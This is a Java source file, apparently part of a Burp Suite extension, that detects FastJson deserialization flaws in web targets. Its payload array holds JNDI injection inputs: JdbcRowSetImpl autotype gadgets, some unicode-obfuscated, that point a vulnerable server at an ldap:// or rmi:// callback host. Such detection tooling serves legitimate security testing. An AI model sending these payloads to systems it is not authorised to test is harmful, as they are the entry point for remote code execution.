package burp.Application.FastJsonFingerprintDetection;

import burp.Application.FastJsonFingerprintDetection.ExtensionMethod.*;

import burp.Bootstrap.BurpAnalyzedRequest;
import burp.IBurpExtenderCallbacks;

import java.util.Date;

public class FastJsonFingerprint {
    private FastJsonFingerprintTypeInterface fastJsonFingerprintType;

    // 该模块启动日期
    private Date startDate = new Date();

    // 程序最大执行时间,单位为秒
    // 会根据payload的添加而添加
    private int maxExecutionTime = 120;

    public FastJsonFingerprint(
            IBurpExtenderCallbacks callbacks,
            BurpAnalyzedRequest baseAnalyzedRequest,
            String callClassName) {
        this.init(callbacks, baseAnalyzedRequest, callClassName);
    }

    private FastJsonFingerprintTypeInterface init(IBurpExtenderCallbacks callbacks,
                                                  BurpAnalyzedRequest baseAnalyzedRequest,
                                                  String callClassName) {
        String[] payloads = {
                "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://dnslog-url/miao1\",\"autoCommit\":true}}",
                "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://dnslog-url/miao2\",\"autoCommit\":true}}",
                "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/miao3\",\"autoCommit\":true}}",
                "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/miao4\",\"autoCommit\":true}}",
        };

        // 获得最终的程序最大执行时间
        int keyLength = payloads.length;
        if (keyLength > 20) {
            this.maxExecutionTime += (keyLength - 20) * 6;
        }

        if (callClassName.equals("FastJsonFingerprintType1")) {
            FastJsonFingerprintType1 fastJsonFingerprintType = new FastJsonFingerprintType1(
                    callbacks,
                    baseAnalyzedRequest,
                    payloads,
                    this.startDate,
                    this.maxExecutionTime);
            this.fastJsonFingerprintType = fastJsonFingerprintType;
            return this.fastJsonFingerprintType;
        }

        throw new IllegalArgumentException(
                String.format("FastJson指纹识别模块-对不起您输入的 %s 扩展找不到", callClassName));
    }

    public FastJsonFingerprintTypeInterface run() {
        return this.fastJsonFingerprintType;
    }
}
